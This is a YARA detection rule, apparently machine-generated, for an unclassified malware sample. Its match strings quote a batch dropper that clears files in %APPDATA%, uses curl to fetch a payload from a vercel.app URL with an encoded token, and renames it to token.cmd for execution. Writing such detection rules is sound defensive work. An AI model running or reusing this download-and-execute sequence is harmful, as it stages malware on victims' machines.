rule MULTI_Sample_Unique_03ca4f25
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (inconnu, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "03ca4f25a47226531641164c89e56b10221e64c24524ecfe31db3b0781de84b2"
        yarahub_uuid = "eaf64b63-869b-4807-8125-fcc5df016339"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "0c114cb1c0e934ca6da87c8456c65389"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "if exist \"%APPDATA%\\parse\" del \"%APPDATA%\\parse\"" ascii
        $s1 = "if exist \"%APPDATA%\\token.cmd\" del \"%APPDATA%\\token.cmd\"" ascii
        $s2 = "if exist \"%APPDATA%\\.sv\" del \"%APPDATA%\\.sv\"" ascii
        $s3 = "curl -s -L -o \"%APPDATA%//parse\" \"http://cleverstack-ext30341.vercel.app/api/tokenw?st=NjNxM0NLczlrQmhHMkxocExwdzdlZz09OkNXcXRrTm1VRnFmTzM0ZXRjSy9NdmwvTmZ2VXdDM3o2TnVpK25nVTJjREZmUjAvNDlzV2R3b2phNEVKV" ascii
        $s4 = "ren \"%APPDATA%\\parse\" token.cmd" ascii
        $s5 = "APPDATA%\\token.cmd\"" ascii
        $s6 = "::@echo off" ascii
    condition:
        true and filesize < 50MB and 3 of ($s0, $s1, $s2, $s4, $s5, $s6) and 1 of ($s3)
}
